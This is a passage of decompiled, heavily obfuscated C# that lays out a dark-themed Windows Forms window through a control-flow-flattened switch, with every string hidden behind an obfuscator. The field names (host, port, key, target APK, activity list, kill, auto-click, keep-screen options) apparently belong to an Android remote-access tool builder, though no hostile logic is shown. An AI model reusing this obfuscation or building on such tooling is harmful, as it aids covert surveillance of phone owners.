            this.TabPage3.Controls.Add((Control) this.DrakeUIAvatar6);
            this.TabPage3.Controls.Add((Control) this.checkautoclick);
            this.TabPage3.Controls.Add((Control) this.checkDraw);
            num1 = (int) num3 * 1839301793 ^ 178981607;
            continue;
          case 179:
            this.TheKey.Size = new Size(228, 32);
            num1 = (int) num3 * 382713192 ^ 2018979794;
            continue;
          case 180:
            this.msgtext.Minimum = (double) int.MinValue;
            num1 = (int) num3 * 638053596 ^ -733033627;
            continue;
          case 181:
            this.ResumeLayout(false);
            num1 = (int) num3 * -626381283 ^ -1040734977;
            continue;
          case 182:
            this.Label14.Size = new Size(132, 27);
            num1 = (int) num3 * -204008424 ^ 175437096;
            continue;
          case 183:
            this.Activlist.Font = new Font(EXGuarder.\u0032F541671, 12f);
            num1 = (int) num3 * 1253903383 ^ 1150711879;
            continue;
          case 184:
            this.CLiname.StyleCustomMode = true;
            this.CLiname.TabIndex = 19;
            num1 = (int) num3 * -210091333 ^ 1121372753;
            continue;
          case 185:
            this.checkprotector.Text = EXGuarder.\u003722C3D40;
            num1 = (int) num3 * 1550436584 ^ 624660617;
            continue;
          case 186:
            this.TabPage4.Controls.Add((Control) this.log);
            num1 = (int) num3 * 263893003 ^ -860793178;
            continue;
          case 187:
            this.Label6.TabIndex = 31;
            this.Label6.Text = EXGuarder.\u00377021331;
            num1 = (int) num3 * 1585243625 ^ -1069209449;
            continue;
          case 188:
            this.Panel1.Controls.Add((Control) this.CLiname);
            num1 = (int) num3 * 783543098 ^ -1975110960;
            continue;
          case 189:
            this.Activlist.Size = new Size(529, 158);
            num1 = (int) num3 * 2053458225 ^ 2108098433;
            continue;
          case 190:
            this.Label4.Name = EXGuarder.\u00359200C5A;
            this.Label4.Size = new Size(193, 27);
            num1 = (int) num3 * -1273596742 ^ 440493912;
            continue;
          case 191:
            this.checkkill.Text = EXGuarder.\u00340407107;
            num1 = (int) num3 * 1300313095 ^ -1815186053;
            continue;
          case 192:
            this.Host.Padding = new Padding(5);
            this.Host.Radius = 15;
            num1 = (int) num3 * -108188801 ^ 1241727696;
            continue;
          case 193:
            this.maintapcontrols.TextAlignment = HorizontalAlignment.Left;
            this.TabPage1.BackColor = Color.Black;
            num1 = (int) num3 * -458577861 ^ 1017258806;
            continue;
          case 194:
            this.DrakeUIAvatar6.Size = new Size(36, 28);
            this.DrakeUIAvatar6.Style = UIStyle.Custom;
            num1 = (int) num3 * -1173746303 ^ 828989860;
            continue;
          case 195:
            this.CLiname.Minimum = (double) int.MinValue;
            this.CLiname.Name = EXGuarder.\u003445D4823;
            num1 = (int) num3 * 818694291 ^ 144763682;
            continue;
          case 196:
            this.TheKey.Margin = new Padding(4, 5, 4, 5);
            num1 = (int) num3 * 1612408567 ^ 813590425;
            continue;
          case 197:
            this.Label14.TabIndex = 38;
            num1 = (int) num3 * -520210087 ^ -1708977203;
            continue;
          case 198:
            this.addactiv.Name = EXGuarder.\u0030C355E1A;
            this.addactiv.Size = new Size(93, 34);
            this.addactiv.TabIndex = 11;
            num1 = (int) num3 * -451949749 ^ 1085826292;
            continue;
          case 199:
            this.checkautoclick.Text = EXGuarder.\u00301205B26;
            this.ToolTip1.SetToolTip((Control) this.checkautoclick, EXGuarder.\u0034D744638);
            this.checkautoclick.UseVisualStyleBackColor = true;
            num1 = (int) num3 * -1110306239 ^ -122848973;
            continue;
          case 200:
            this.Button3.BackColor = Color.Black;
            num1 = (int) num3 * -1548351974 ^ -1928091176;
            continue;
          case 201:
            this.DrakeUIAvatar6.TabIndex = 41;
            num1 = (int) num3 * 2056043236 ^ 115783712;
            continue;
          case 202:
            this.paneltargetfolder.SuspendLayout();
            ((ISupportInitialize) this.PictureBox1).BeginInit();
            this.maintapcontrols.SuspendLayout();
            num1 = (int) num3 * -2077320505 ^ -981803045;
            continue;
          case 203:
            ((ISupportInitialize) this.PictureBox1).EndInit();
            this.maintapcontrols.ResumeLayout(false);
            this.TabPage1.ResumeLayout(false);
            this.list_activ.ResumeLayout(false);
            num1 = (int) num3 * 416653067 ^ 1706303666;
            continue;
          case 204:
            this.PictureBox1.Location = new Point(233, 81);
            num1 = (int) num3 * -388963010 ^ -1998965496;
            continue;
          case 205:
            this.Label14.Text = EXGuarder.\u0031C160D55;
            this.ComboPrims.BackColor = Color.Black;
            num1 = (int) num3 * 1325885580 ^ 1202639928;
            continue;
          case 206:
            this.Label3.Location = new Point(411, 107);
            num1 = (int) num3 * -1993299275 ^ -103742604;
            continue;
          case 207:
            this.Label14.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Label14.Location = new Point(152, 394);
            this.Label14.Name = EXGuarder.\u003763E240F;
            num1 = (int) num3 * -1571277121 ^ 523872720;
            continue;
          case 208:
            this.maintapcontrols.SelectedIndex = 0;
            num1 = (int) num3 * -242216695 ^ 849610208;
            continue;
          case 209:
            this.list_activ.Controls.Add((Control) this.selectapkbtn);
            this.list_activ.Controls.Add((Control) this.paneltargetfolder);
            num1 = (int) num3 * 1299172610 ^ -655449324;
            continue;
          case 210:
            this.log.Dock = DockStyle.Fill;
            num1 = (int) num3 * -9634752 ^ -1218328142;
            continue;
          case 211:
            this.Host.ForeColor = Color.White;
            this.Host.Location = new Point(22, 249);
            num1 = (int) num3 * 1091584335 ^ 1057992507;
            continue;
          case 212:
            this.TabPage1.SuspendLayout();
            this.list_activ.SuspendLayout();
            this.panelactivitys.SuspendLayout();
            this.TabPage3.SuspendLayout();
            this.TabPage4.SuspendLayout();
            this.DrakeUITitlePanel2.SuspendLayout();
            num1 = (int) num3 * -578631504 ^ -1575527820;
            continue;
          case 213:
            this.Label7.Location = new Point(82, 107);
            this.Label7.Name = EXGuarder.\u003594E2627;
            this.Label7.Size = new Size(131, 29);
            num1 = (int) num3 * 851070662 ^ -1074586762;
            continue;
          case 214:
            this.Activlist.Style = UIStyle.Custom;
            this.Activlist.StyleCustomMode = true;
            this.Activlist.TabIndex = 21;
            num1 = (int) num3 * -1611762276 ^ 1701442418;
            continue;
          case 215:
            this.Activlist.BackColor = Color.FromArgb(20, 31, 20);
            num1 = (int) num3 * -2076457836 ^ 224504227;
            continue;
          case 216:
            this.Host.Name = EXGuarder.\u003463C021B;
            num1 = (int) num3 * -1160129943 ^ -905316294;
            continue;
          case 217:
            this.CLiname.Cursor = Cursors.IBeam;
            this.CLiname.FillColor = Color.Black;
            this.CLiname.Font = new Font(EXGuarder.\u0032F541671, 12f);
            num1 = (int) num3 * 1039277190 ^ -984217411;
            continue;
          case 218:
            this.Label14 = new Label();
            num1 = (int) num3 * 639005537 ^ -1593278039;
            continue;
          case 219:
            this.labeltargetapp.Font = new Font(EXGuarder.\u0032F541671, 13f);
            this.labeltargetapp.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -2132920696 ^ -658702340;
            continue;
          case 220:
            this.log.Name = EXGuarder.\u00351745005;
            this.log.ReadOnly = true;
            num1 = (int) num3 * 2112533824 ^ -1475925471;
            continue;
          case 221:
            this.Label2.AutoSize = true;
            num1 = (int) num3 * 496912763 ^ 355199368;
            continue;
          case 222:
            this.PictureBox1.TabIndex = 23;
            num1 = (int) num3 * -488593839 ^ -1943926521;
            continue;
          case 223:
            this.checksuper.Font = new Font(EXGuarder.\u0032F541671, 12f, FontStyle.Bold);
            this.checksuper.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1676455523 ^ 522172091;
            continue;
          case 224:
            this.DrakeUIAvatar5.AvatarSize = 25;
            num1 = (int) num3 * 1163530526 ^ 1100315326;
            continue;
          case 225:
            this.Label12.Text = EXGuarder.\u0033D680169;
            num1 = (int) num3 * 769123999 ^ 1442049714;
            continue;
          case 226:
            this.removeactiv = new Button();
            num1 = (int) num3 * -1864497649 ^ -857988475;
            continue;
          case 227:
            this.Label2.TabIndex = 2;
            num1 = (int) num3 * 1214553234 ^ -362616977;
            continue;
          case 228:
            this.DrakeUITitlePanel2.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1971903863 ^ 2145076250;
            continue;
          case 229:
            this.DrakeUIAvatar5.TabIndex = 36;
            this.DrakeUIAvatar5.Text = EXGuarder.\u0030B41503C;
            this.ToolTip1.SetToolTip((Control) this.DrakeUIAvatar5, EXGuarder.\u0034E0D0952);
            this.checkDraw.AutoSize = true;
            num1 = (int) num3 * 1093132403 ^ -937062282;
            continue;
          case 230:
            this.labeltargetapp.Enabled = false;
            num1 = (int) num3 * 346959112 ^ 2101987680;
            continue;
          case 231:
            this.DrakeUIAvatar6.Location = new Point(361, 199);
            this.DrakeUIAvatar6.Name = EXGuarder.\u0035B767642;
            num1 = (int) num3 * 1723226383 ^ 1546546120;
            continue;
          case 232:
            this.checkonlymain.CheckBoxColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1832114635 ^ 799356908;
            continue;
          case 233:
            this.TheKey.Name = EXGuarder.\u00346227621;
            this.TheKey.Padding = new Padding(5);
            num1 = (int) num3 * 1109542315 ^ -58610429;
            continue;
          case 234:
            this.DrakeUIAvatar6.AvatarSize = 25;
            this.DrakeUIAvatar6.BackColor = Color.Transparent;
            this.DrakeUIAvatar6.FillColor = Color.Black;
            num1 = (int) num3 * 224060078 ^ -569008414;
            continue;
          case 235:
            this.checkDraw.Text = EXGuarder.\u00333190401;
            num1 = (int) num3 * 956143834 ^ 408860669;
            continue;
          case 236:
            this.maintapcontrols.Size = new Size(817, 629);
            num1 = (int) num3 * -308094123 ^ 1808215444;
            continue;
          case 237:
            this.PictureBox1.TabStop = false;
            num1 = (int) num3 * 720268154 ^ -679146636;
            continue;
          case 238:
            this.ComboPrims.FlatStyle = FlatStyle.Popup;
            num1 = (int) num3 * -1778111126 ^ -1789373434;
            continue;
          case 239:
            this.DrakeUITitlePanel2.Controls.Add((Control) this.DrakeUIAvatar4);
            num1 = (int) num3 * -1071312924 ^ -1030061489;
            continue;
          case 240:
            this.msgtext.Watermark = EXGuarder.\u0037927684E;
            num1 = (int) num3 * 1637499961 ^ 949503571;
            continue;
          case 241:
            this.Label12 = new Label();
            num1 = (int) num3 * 1933323367 ^ 1677730305;
            continue;
          case 242:
            this.TabPage3.Size = new Size(691, 629);
            this.TabPage3.TabIndex = 2;
            this.TabPage3.Text = EXGuarder.\u00311162D37;
            this.msgtext.Cursor = Cursors.IBeam;
            this.msgtext.FillColor = Color.Black;
            this.msgtext.Font = new Font(EXGuarder.\u0032F541671, 12f);
            this.msgtext.ForeColor = Color.White;
            num1 = (int) num3 * -1704349168 ^ 509702375;
            continue;
          case 243:
            this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
            num1 = (int) num3 * 817018703 ^ -238531722;
            continue;
          case 244:
            this.maintapcontrols.Style = UIStyle.Custom;
            num1 = (int) num3 * 1129748002 ^ 28627681;
            continue;
          case 245:
            this.Activlist.FillDisableColor = Color.FromArgb(20, 31, 20);
            num1 = (int) num3 * -922924102 ^ 2118491607;
            continue;
          case 246:
            this.panelactivitys.Size = new Size(559, 239);
            num1 = (int) num3 * 1339367734 ^ -1545692128;
            continue;
          case 247:
            this.FolderPath = new TextBox();
            num1 = (int) num3 * 834889942 ^ -937192357;
            continue;
          case 248:
            this.Panel1.Controls.Add((Control) this.Port);
            num1 = (int) num3 * 1918710067 ^ 1970487007;
            continue;
          case 249:
            this.checkautoclick.Location = new Point(403, 199);
            num1 = (int) num3 * -1021193445 ^ -1182941972;
            continue;
          case 250:
            this.Button3.TabIndex = 13;
            num1 = (int) num3 * -1659498995 ^ 1152204732;
            continue;
          case 251:
            this.Label6.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Label6.Location = new Point(56, 204);
            this.Label6.Name = EXGuarder.\u00342112311;
            num1 = (int) num3 * -1701761617 ^ -812838728;
            continue;
          case 252:
            this.Port.Minimum = (double) int.MinValue;
            this.Port.Name = EXGuarder.\u0030A4D2445;
            num1 = (int) num3 * 1153518656 ^ 1528581708;
            continue;
          case 253:
            this.panelactivitys.TabIndex = 28;
            num1 = (int) num3 * 1600799705 ^ 124585198;
            continue;
          case 254:
            this.paneltargetfolder.PerformLayout();
            num1 = (int) num3 * -398814185 ^ 366865517;
            continue;
          case (uint) byte.MaxValue:
            this.DrakeUIAvatar4 = new DrakeUIAvatar();
            num1 = (int) num3 * -2110218162 ^ 1553099879;
            continue;
          case 256:
            this.selectapkbtn.TabIndex = 25;
            this.selectapkbtn.Text = EXGuarder.\u003113A5F25;
            num1 = (int) num3 * 1844115940 ^ 724182777;
            continue;
          case 257:
            this.TheKey.Location = new Point(314, 141);
            num1 = (int) num3 * 912523644 ^ 881075759;
            continue;
          case 258:
            this.FolderPath.Name = EXGuarder.\u0033C6F1B3E;
            num1 = (int) num3 * 649392098 ^ 496958767;
            continue;
          case 259:
            this.ComboPrims.Items.AddRange(new object[2]
            {
              (object) EXGuarder.\u0030D741F0F,
              (object) EXGuarder.\u0033B773B05
            });
            num1 = (int) num3 * -1801137618 ^ 463611847;
            continue;
          case 260:
            this.DrakeUITitlePanel2.ResumeLayout(false);
            this.mnulpanel.ResumeLayout(false);
            this.Panel5.ResumeLayout(false);
            num1 = (int) num3 * -1039325505 ^ -1794098329;
            continue;
          case 261:
            this.Panel5.Dock = DockStyle.Fill;
            num1 = (int) num3 * -418860785 ^ -948871891;
            continue;
          case 262:
            this.msgtext.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.msgtext.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * 134031472 ^ -164500864;
            continue;
          case 263:
            this.DrakeUIAvatar6.Text = EXGuarder.\u0035B767642;
            num1 = (int) num3 * -736640532 ^ -1202356680;
            continue;
          case 264:
            this.DrakeWidth_W1.Size = new Size(589, 1);
            num1 = (int) num3 * -785928347 ^ 1483888220;
            continue;
          case 265:
            this.removeactiv.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.removeactiv.Location = new Point(342, 19);
            num1 = (int) num3 * 2095265722 ^ -891967524;
            continue;
          case 266:
            this.TabPage4.TabIndex = 3;
            num1 = (int) num3 * -528649694 ^ -2058687238;
            continue;
          case 267:
            this.mnulpanel.Location = new Point(0, 0);
            this.mnulpanel.Name = EXGuarder.\u00362750806;
            this.mnulpanel.Size = new Size(817, 629);
            num1 = (int) num3 * 2076297766 ^ -97366944;
            continue;
          case 268:
            this.msgtext.Radius = 10;
            num1 = (int) num3 * 580039582 ^ 1077229424;
            continue;
          case 269:
            this.maintapcontrols.Controls.Add((Control) this.list_activ);
            this.maintapcontrols.Controls.Add((Control) this.TabPage3);
            this.maintapcontrols.Controls.Add((Control) this.TabPage4);
            this.maintapcontrols.Dock = DockStyle.Fill;
            num1 = (int) num3 * -970247699 ^ 1444935147;
            continue;
          case 270:
            this.titletext.Location = new Point(56, 208);
            num1 = (int) num3 * 2092167142 ^ -2009657411;
            continue;
          case 271:
            this.TabPage4.ResumeLayout(false);
            this.TabPage4.PerformLayout();
            num1 = (int) num3 * -1665979053 ^ -1389693830;
            continue;
          case 272:
            this.maintapcontrols.TabUnSelectedForeColor = Color.White;
            num1 = (int) num3 * 2080471741 ^ -1404633204;
            continue;
          case 273:
            this.Label5.Font = new Font(EXGuarder.\u0032F541671, 13f);
            num1 = (int) num3 * 1190880163 ^ -1433550685;
            continue;
          case 274:
            this.TabPage4 = new TabPage();
            num1 = (int) num3 * 376291692 ^ 678446305;
            continue;
          case 275:
            this.log.Font = new Font(EXGuarder.\u0032F541671, 10f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * -2008476752 ^ 54464598;
            continue;
          case 276:
            this.msgtext.Margin = new Padding(5, 6, 5, 6);
            this.msgtext.Maximum = (double) int.MaxValue;
            num1 = (int) num3 * -352527755 ^ 502782213;
            continue;
          case 277:
            this.list_activ.Controls.Add((Control) this.Label6);
            num1 = (int) num3 * -1953291532 ^ 914809680;
            continue;
          case 278:
            this.checkautoclick.Name = EXGuarder.\u003734C3F28;
            num1 = (int) num3 * -510807846 ^ 1331194940;
            continue;
          case 279:
            this.DrakeUITitlePanel2.TitleColor = Color.Black;
            num1 = (int) num3 * 2071624222 ^ -345379250;
            continue;
          case 280:
            this.Label14.Font = new Font(EXGuarder.\u0032F541671, 13f);
            num1 = (int) num3 * 702435493 ^ -132316064;
            continue;
          case 281:
            this.Panel1.Size = new Size(574, 334);
            this.Panel1.TabIndex = 19;
            num1 = (int) num3 * -1724218506 ^ 1421320031;
            continue;
          case 282:
            this.checkkeepscreen.Text = EXGuarder.\u00318307968;
            this.ToolTip1.SetToolTip((Control) this.checkkeepscreen, EXGuarder.\u0034D744638);
            this.checkkeepscreen.UseVisualStyleBackColor = true;
            num1 = (int) num3 * 1965349704 ^ 1717354027;
            continue;
          case 283:
            this.DrakeUITitlePanel2.Dock = DockStyle.Bottom;
            this.DrakeUITitlePanel2.FillColor = Color.Black;
            this.DrakeUITitlePanel2.Font = new Font(EXGuarder.\u0032F541671, 9f);
            this.DrakeUITitlePanel2.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1822589350 ^ -923591894;
            continue;
          case 284:
            this.DrakeUIAvatar6.Symbol = 61529;
            this.DrakeUIAvatar6.SymbolSize = 25;
            num1 = (int) num3 * -313598935 ^ 663162698;
            continue;
          case 285:
            this.paneltargetfolder.Name = EXGuarder.\u0035155143F;
            num1 = (int) num3 * -1893059575 ^ -237532946;
            continue;
          case 286:
            this.Host.Margin = new Padding(4, 5, 4, 5);
            this.Host.Maximum = (double) int.MaxValue;
            this.Host.Minimum = (double) int.MinValue;
            num1 = (int) num3 * 269349499 ^ -941817754;
            continue;
          case 287:
            this.TheKey.Cursor = Cursors.IBeam;
            this.TheKey.FillColor = Color.Black;
            num1 = (int) num3 * -1039004299 ^ -518826170;
            continue;
          case 288:
            this.Port.Size = new Size(228, 32);
            this.Port.Style = UIStyle.Custom;
            num1 = (int) num3 * -599338249 ^ 1435658347;
            continue;
          case 289:
            this.TabPage3.Controls.Add((Control) this.Label14);
            this.TabPage3.Controls.Add((Control) this.ComboPrims);
            num1 = (int) num3 * 391035810 ^ -1417980468;
            continue;
          case 290:
            this.TheKey.Font = new Font(EXGuarder.\u0032F541671, 12f);
            num1 = (int) num3 * 1600340118 ^ 1463334889;
            continue;
          case 291:
            this.titletext = new DrakeUITextBox();
            num1 = (int) num3 * -1389545881 ^ -2108283394;
            continue;
          case 292:
            this.Panel1.PerformLayout();
            num1 = (int) num3 * 913310428 ^ 1413846403;
            continue;
          case 293:
            this.FolderPath.ForeColor = Color.White;
            num1 = (int) num3 * -1224449206 ^ 528680005;
            continue;
          case 294:
            this.TabPage3 = new TabPage();
            num1 = (int) num3 * -1818245282 ^ -1519349599;
            continue;
          case 295:
            this.checkkill.Location = new Point(403, 233);
            this.checkkill.Name = EXGuarder.\u00347166078;
            num1 = (int) num3 * 1406343901 ^ 454852858;
            continue;
          case 296:
            this.DrakeUIAvatar4.BackColor = Color.Transparent;
            num1 = (int) num3 * -1404227705 ^ 386440585;
            continue;
          case 297:
            this.DrakeUITitlePanel2.TextAlign = HorizontalAlignment.Right;
            num1 = (int) num3 * -1124103218 ^ -20438949;
            continue;
          case 298:
            this.Button3.Location = new Point(0, 0);
            num1 = (int) num3 * 673418311 ^ 643143025;
            continue;
          case 299:
            this.TheKey = new DrakeUITextBox();
            num1 = (int) num3 * -496247439 ^ 1476446655;
            continue;
          case 300:
            this.DrakeUIAvatar4.TabIndex = 0;
            num1 = (int) num3 * -348431383 ^ -492663499;
            continue;
          case 301:
            this.Label12.Font = new Font(EXGuarder.\u0035E136B3A, 14f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * -1378947522 ^ 1999590090;
            continue;
          case 302:
            this.TabPage3.Controls.Add((Control) this.DrakeUIAvatar5);
            this.TabPage3.Controls.Add((Control) this.Label12);
            num1 = (int) num3 * 165774756 ^ -80677833;
            continue;
          case 303:
            this.Port.Padding = new Padding(5);
            this.Port.Radius = 15;
            this.Port.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1543600361 ^ -1635265540;
            continue;
          case 304:
            this.addactiv.Font = new Font(EXGuarder.\u0032F541671, 9f);
            num1 = (int) num3 * 1669246793 ^ 1129147901;
            continue;
          case 305:
            this.TargetApktext.ForeColor = Color.White;
            num1 = (int) num3 * 230682111 ^ -1222041286;
            continue;
          case 306:
            this.Label3 = new Label();
            num1 = (int) num3 * 1500371923 ^ -1024956287;
            continue;
          case 307:
            this.panelactivitys.Controls.Add((Control) this.addactiv);
            this.panelactivitys.Controls.Add((Control) this.removeactiv);
            num1 = (int) num3 * 302474349 ^ -1517125558;
            continue;
          case 308:
            this.msgtext.Size = new Size(254, 32);
            num1 = (int) num3 * 1920302322 ^ 24827103;
            continue;
          case 309:
            this.PictureBox1.Size = new Size(169, 112);
            num1 = (int) num3 * -812643333 ^ -1646315274;
            continue;
          case 310:
            this.CLiname = new DrakeUITextBox();
            this.paneltargetfolder = new Panel();
            this.ToolTip1 = new ToolTip(this.components);
            this.checkkill = new CheckBox();
            num1 = (int) num3 * 1127718261 ^ -558765251;
            continue;
          case 311:
            this.TheKey.Maximum = (double) int.MaxValue;
            num1 = (int) num3 * 1475979403 ^ 1340960126;
            continue;
          case 312:
            this.checkonlymain.Name = EXGuarder.\u003683D2240;
            num1 = (int) num3 * -1734804995 ^ 1307397662;
            continue;
          case 313:
            this.checkonlymain.Enabled = false;
            num1 = (int) num3 * -1935779613 ^ -1935518547;
            continue;
          case 314:
            this.Label4.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -35748659 ^ -1191393635;
            continue;
          case 315:
            this.Button3.Text = EXGuarder.\u0034E233674;
            num1 = (int) num3 * 1745754535 ^ 90963971;
            continue;
          case 316:
            this.selectapkbtn.Location = new Point(539, 33);
            this.selectapkbtn.Name = EXGuarder.\u00355134D15;
            this.selectapkbtn.Size = new Size(115, 27);
            num1 = (int) num3 * 780639986 ^ 2033625804;
            continue;
          case 317:
            this.ComboPrims.DropDownStyle = ComboBoxStyle.DropDownList;
            num1 = (int) num3 * 372035395 ^ -1657515537;
            continue;
          case 318:
            this.TheKey.TextAlignment = ContentAlignment.TopCenter;
            this.Port.Cursor = Cursors.IBeam;
            num1 = (int) num3 * 621800739 ^ -1230794873;
            continue;
          case 319:
            this.maintapcontrols.TabSelectedHighColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1363854697 ^ -1369058343;
            continue;
          case 320:
            this.titletext.Minimum = (double) int.MinValue;
            this.titletext.Name = EXGuarder.\u003120C5F35;
            num1 = (int) num3 * 1211452176 ^ -298478481;
            continue;
          case 321:
            this.maintapcontrols.StyleCustomMode = true;
            num1 = (int) num3 * 906409745 ^ -1289552384;
            continue;
          case 322:
            this.checkautoclick.AutoSize = true;
            this.checkautoclick.Font = new Font(EXGuarder.\u0032F541671, 12f, FontStyle.Bold);
            this.checkautoclick.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -684183939 ^ 1577742631;
            continue;
          case 323:
            this.DrakeUIAvatar4.Font = new Font(EXGuarder.\u0032F541671, 12f);
            this.DrakeUIAvatar4.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 836710715 ^ 1802391144;
            continue;
          case 324:
            this.titletext.Radius = 10;
            this.titletext.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.titletext.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * 1623216352 ^ -1285678639;
            continue;
          case 325:
            this.Port.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * 1817656771 ^ 870087775;
            continue;
          case 326:
            this.Activlist.ItemSelectForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Activlist.Location = new Point(16, 61);
            this.Activlist.Margin = new Padding(4, 5, 4, 5);
            this.Activlist.Name = EXGuarder.\u00334381D1C;
            this.Activlist.Padding = new Padding(7);
            this.Activlist.Radius = 15;
            num1 = (int) num3 * -2026553979 ^ -474705508;
            continue;
          case 327:
            this.PictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
            num1 = (int) num3 * 1247598308 ^ -376284316;
            continue;
          case 328:
            this.CheckAutomatic.Padding = new Padding(22, 0, 0, 0);
            this.CheckAutomatic.Size = new Size(137, 29);
            num1 = (int) num3 * 102556388 ^ 215780138;
            continue;
          case 329:
            this.BackColor = Color.Black;
            this.ClientSize = new Size(817, 663);
            this.Controls.Add((Control) this.Panel5);
            this.Controls.Add((Control) this.DrakeUITitlePanel2);
            this.DoubleBuffered = true;
            num1 = (int) num3 * -1700380569 ^ 1414641459;
            continue;
          case 330:
            this.DrakeUITitlePanel2.Text = EXGuarder.\u003455D380D;
            num1 = (int) num3 * -211325391 ^ 201707492;
            continue;
          case 331:
            this.TheKey.Radius = 15;
            num1 = (int) num3 * 1180034558 ^ -1921414319;
            continue;
          case 332:
            this.DrakeUIAvatar4.FillColor = Color.Black;
            num1 = (int) num3 * 758416892 ^ -1760980783;
            continue;
          case 333:
            this.Activlist = new DrakeUIListBox();
            num1 = (int) num3 * 136189168 ^ -665086869;
            continue;
          case 334:
            this.TargetApktext.Name = EXGuarder.\u00315293275;
            num1 = (int) num3 * -1948128093 ^ 718576976;
            continue;
          case 335:
            this.DrakeWidth_W1.TabIndex = 30;
            this.checkprotector.CheckBoxColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -283688079 ^ 1793837162;
            continue;
          case 336:
            this.CLiname.Style = UIStyle.Custom;
            num1 = (int) num3 * -1560314817 ^ -1437434634;
            continue;
          case 337:
            this.addactiv.FlatStyle = FlatStyle.Flat;
            num1 = (int) num3 * -231075712 ^ -675562091;
            continue;
          case 338:
            this.titletext.FillColor = Color.Black;
            num1 = (int) num3 * 207422945 ^ 514593009;
            continue;
          case 339:
            this.Label3.Name = EXGuarder.\u00340437064;
            this.Label3.Size = new Size(47, 29);
            this.Label3.TabIndex = 4;
            this.Label3.Text = EXGuarder.\u003011B0655;
            num1 = (int) num3 * 739014387 ^ 1166678093;
            continue;
          case 340:
            this.DrakeUITitlePanel2.TabIndex = 31;
            num1 = (int) num3 * 1778671329 ^ -1885201640;
            continue;
          case 341:
            this.maintapcontrols.FillColor = Color.Black;
            num1 = (int) num3 * 1490002282 ^ -1164713416;
            continue;
          case 342:
            this.checksuper.Name = EXGuarder.\u00303173D69;
            num1 = (int) num3 * 231174701 ^ -757255048;
            continue;
          case 343:
            this.checkprotector.TabIndex = 29;
            num1 = (int) num3 * 1117290134 ^ -1931864615;
            continue;
          case 344:
            this.checkprotector.Enabled = false;
            this.checkprotector.Font = new Font(EXGuarder.\u0032F541671, 12f);
            num1 = (int) num3 * -83037510 ^ -1506893153;
            continue;
          case 345:
            this.TargetApktext.BackColor = Color.FromArgb(23, 23, 23);
            this.TargetApktext.Enabled = false;
            num1 = (int) num3 * -1859495035 ^ 1380670181;
            continue;
          case 346:
            this.Port.FillColor = Color.Black;
            num1 = (int) num3 * -1395811550 ^ -940980411;
            continue;
          case 347:
            this.AutoScaleMode = AutoScaleMode.Font;
            num1 = (int) num3 * 980887322 ^ -396892426;
            continue;
          case 348:
            this.TabPage1.Controls.Add((Control) this.Panel1);
            this.TabPage1.Location = new Point(126, 0);
            num1 = (int) num3 * -314410307 ^ 1121889837;
            continue;
          case 349:
            this.selectapkbtn.FlatStyle = FlatStyle.Flat;
            this.selectapkbtn.Font = new Font(EXGuarder.\u0032F541671, 9f);
            this.selectapkbtn.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1249916788 ^ 1485376067;
            continue;
          case 350:
            this.Button3.Dock = DockStyle.Top;
            num1 = (int) num3 * 1497813082 ^ -710967935;
            continue;
          case 351:
            this.mnulpanel.Controls.Add((Control) this.maintapcontrols);
            this.mnulpanel.Dock = DockStyle.Fill;
            num1 = (int) num3 * 175841229 ^ 339308714;
            continue;
          case 352:
            this.FolderPath.BackColor = Color.FromArgb(23, 23, 23);
            num1 = (int) num3 * -908054272 ^ -1046345775;
            continue;
          case 353:
            this.checkprotector.Name = EXGuarder.\u003473B6973;
            this.checkprotector.Padding = new Padding(22, 0, 0, 0);
            this.checkprotector.Size = new Size(490, 29);
            num1 = (int) num3 * -1827722344 ^ 1073260582;
            continue;
          case 354:
            this.Button3.ForeColor = Color.Lime;
            num1 = (int) num3 * 1820981533 ^ 252296498;
            continue;
          case 355:
            this.checksuper.Size = new Size(206, 28);
            this.checksuper.TabIndex = 16;
            num1 = (int) num3 * 1282589064 ^ -783973346;
            continue;
          case 356:
            this.labeltargetapp = new Label();
            this.TargetApktext = new TextBox();
            this.selectapkbtn = new Button();
            num1 = (int) num3 * -968379660 ^ -1923968771;
            continue;
          case 357:
            this.labeltargetapp.Location = new Point(193, 30);
            this.labeltargetapp.Name = EXGuarder.\u00349233F4B;
            this.labeltargetapp.Size = new Size(108, 27);
            this.labeltargetapp.TabIndex = 23;
            num1 = (int) num3 * -2107724141 ^ -431557101;
            continue;
          case 358:
            this.removeactiv.FlatStyle = FlatStyle.Flat;
            this.removeactiv.Font = new Font(EXGuarder.\u0032F541671, 9f);
            num1 = (int) num3 * -1837819187 ^ -1014410155;
            continue;
          case 359:
            this.CLiname.Margin = new Padding(4, 5, 4, 5);
            num1 = (int) num3 * -553148518 ^ -675911501;
            continue;
          case 360:
            this.CheckAutomatic.Style = UIStyle.Custom;
            num1 = (int) num3 * -361097278 ^ 1181144520;
            continue;
          case 361:
